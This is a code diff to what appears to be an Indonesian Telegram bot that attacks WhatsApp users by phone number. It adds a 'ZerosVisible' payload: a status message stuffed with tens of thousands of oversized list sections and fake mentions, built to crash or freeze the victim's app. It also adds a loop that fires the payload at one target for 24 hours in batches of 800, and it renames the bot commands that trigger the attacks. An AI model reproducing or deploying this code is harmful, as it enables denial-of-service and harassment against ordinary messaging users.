@@ -487,6 +487,125 @@ async function FlowX(target) {
     participant: { jid: target },
   });
 }
+async function ZerosVisible(target, mention) { // Default true biar otomatis nyala
+    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
+        title: "᭡꧈".repeat(95000),
+        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
+    }));
+
+    const MSG = {
+        viewOnceMessage: {
+            message: {
+                listResponseMessage: {
+                    title: "You Loser ×_×",
+                    listType: 2,
+                    buttonText: null,
+                    sections: delaymention,
+                    singleSelectReply: { selectedRowId: "🔴" },
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 30000 }, () => 
+                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+                        ),
+                        participant: target,
+                        remoteJid: "status@broadcast",
+                        forwardingScore: 9741,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: "333333333333@newsletter",
+                            serverMessageId: 1,
+                            newsletterName: "-"
+                        }
+                    },
+                    description: "𝖹𝖾𝗋𝗈𝗌𝗌"
+                }
+            }
+        },
+        contextInfo: {
+            channelMessage: true,
+            statusAttributionType: 2
+        }
+    };
+
+    const msg = generateWAMessageFromContent(target, MSG, {});
+
+    await sock.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "to",
+                                attrs: { jid: target },
+                                content: undefined
+                            }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
+
+    // **Cek apakah mention true sebelum menjalankan relayMessage**
+    if (mention) {
+        await sock.relayMessage(
+            target,
+            {
+                statusMentionMessage: {
+                    message: {
+                        protocolMessage: {
+                            key: msg.key,
+                            type: 25
+                        }
+                    }
+                }
+            },
+            {
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: { is_status_mention: "Zeros Are Destroyers" },
+                        content: undefined
+                    }
+                ]
+            }
+        );
+    }
+}
+async function sendMessagesForDurationX(durationHours, target) {
+const totalDurationMs = durationHours * 60 * 60 * 1000; // Konversi jam ke milidetik
+const startTime = Date.now();
+let count = 0;
+
+const sendNext = async () => {
+if (Date.now() - startTime >= totalDurationMs) {
+console.log("Pengiriman Selesai Sesuai Durasi Yang Ditentukan.");
+return;
+}
+
+if (count < 800) {
+await ZerosVisible(target, false); // Menggunakan target dari input pengguna
+count++;
+console.log(chalk.red(`Mengirimkan Paket ${count}/800 ke ${target}`));
+   sendNext(); // Melanjutkan pengiriman
+   console.clear();
+} else {
+console.log(chalk.green(`Selesai Mengirimkan 800 Paket Ke ${target}`)); // Log selesai kirim 800 paket
+count = 0; // Reset untuk paket berikutnya
+console.log(chalk.red("Menyiapkan Untuk Mengirim 800 Paket Berikutnya..."));
+setTimeout(sendNext, 5000); // Jeda 5 detik setelah selesai batch 800 pesan
+}
+};
+
+sendNext();
+};
+
 async function VampireNewUi(target, Ptcp = true) {
   try {
     await sock.relayMessage(
@@ -852,20 +971,7 @@ async function NewpayFc1(target) {
                         { name: "send_location", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                         { name: "payments_care_csat", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                         { name: "view_product", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "payment_settings", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "address_message", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "open_webview", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "message_with_link_status", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "payment_status", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },                        { name: "galaxy_costum", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "extensions_message_v2", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "landline_call", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "mpm", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "cta_copy", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "cta_url", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "review_and_pay", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "galaxy_message", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "cta_call", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) }
+                        { name: "payment_settings", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) }
                     ]
                 }
             }
@@ -873,6 +979,7 @@ async function NewpayFc1(target) {
         { participant: { jid: target } }
     );
 }
+
 async function VampCrashCH(target) {
   const msg = generateWAMessageFromContent(target, {
     interactiveMessage: {
@@ -1783,7 +1890,7 @@ bot.onText(/\/cooldown (\d+)m/i, (msg, match) => {
   cooldownTime = newCooldown * 60; // Ubah ke detik
   return bot.sendMessage(chatId, `✅ Cooldown time successfully set to ${newCooldown} menit.`);
 });
-bot.onText(/\/frezechat(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/invis(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1794,12 +1901,12 @@ bot.onText(/\/frezechat(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /frezechat 62×××.");
+        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /invis 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
     if (!/^\d+$/.test(numberTarget)) {
-        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampori 62×××.");
+        return bot.sendMessage(chatId, "❌ Invalid input. Example: /frezechat 62×××.");
     }
 
     const formatedNumber = numberTarget + "@s.whatsapp.net";
@@ -1813,8 +1920,8 @@ bot.onText(/\/frezechat(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
-        await NewpayFc1(formatedNumber);
+    for (let i = 0; i < 1; i++) { // Kirim 3 kali langsung
+        await sendMessagesForDurationX(24, formatedNumber);
     }
 
     // Kirim pesan setelah selesai dengan gambar lain
@@ -1828,7 +1935,7 @@ bot.onText(/\/frezechat(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/supgherdelay(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/freze(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1844,7 +1951,7 @@ bot.onText(/\/supgherdelay(?:\s(.+))?/, async (msg, match) => {
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
     if (!/^\d+$/.test(numberTarget)) {
-        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampbeta 62×××.");
+        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /freze 62×××.");
     }
 
     const formatedNumber = numberTarget + "@s.whatsapp.net";
@@ -1857,42 +1964,9 @@ bot.onText(/\/supgherdelay(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
+    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
+        await freezechat(formatedNumber);
+        await freezechat(formatedNumber);
     }
 
     await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
